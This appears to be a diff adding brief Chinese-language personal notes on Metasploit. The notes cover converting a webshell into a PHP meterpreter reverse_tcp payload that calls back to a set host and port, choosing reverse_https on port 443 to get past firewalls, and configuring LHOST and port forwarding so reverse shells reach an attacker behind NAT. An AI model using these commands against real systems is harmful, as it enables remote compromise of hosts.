@@ -1,0 +1,13 @@
+1.webshell转meterpreter:
+    msfpayload php/meterpreter/reverse_tcp LHOST=192.168.0.114 LPORT=4444 R > 4444.php     kali 1.0.9命令    2.0中msfpayload变成msfvenom,若出错，可msfvenom -h
+2.msf内网与外网间ip设置：
+    
+
+3.reverse_tcp与reverse_http/https区别：
+    两种payload，Windows/meterpreter/reverse_tcp，Windows/meterpreter/reverse_https，后面的http/https可以过防火墙,但是有的时候在得到反弹shell之后.会遇到命令无回显的情况.这个问题。参考国外一些博客的说法是将监听端口改为443便好。
+4.msfvenom命令设置：
+	http://ylck.me/index.php/archives/59/
+5.msf在内网中lhost设置问题的疑惑解决:
+	环境：msf主机在内网，目的主机在外网，使用reverse反向连接
+	过程：msf设置lhost为外网ip，并做好外网ip到msf内网ip的地址和端口转发，在路由器下用路由器实现，没有路由器用lcx或者nc或其他端口转发工具实现，nc还不知道如何实现，以后再探。msf设置lhost为外网ip后，执行exploit命令后会先绑定lhost：lport，但是由于lhost设置为外网ip，所以为显示绑定到lhost：lport失败，然后自动转为绑定到0.0.0.0：lport，这个过程实现的背后内容是：使得目的主机反向链接外网lhost地址，然后msf内网主机在所有本地地址上监听lport，一旦exploit触发成功，外网
+	ip将数据转发到内网msf的ip和port，之后成功连接。这个问题困惑了一段时间，终于想清楚了，后来还做了个两内网间exploit的实验，通过reverse反向连接，设置rhost为目的主机所在的外网主机的ip，并在该外网主机上做好端口转发，于是exploit触发漏洞数据先发送到该外网主机，然后被转发到目的主机（该目的主机在内网），同样设置lhost为msf主机所在外网ip地址，并做好数据转发，最后成功，证明数据的流向和自己所想的一致。
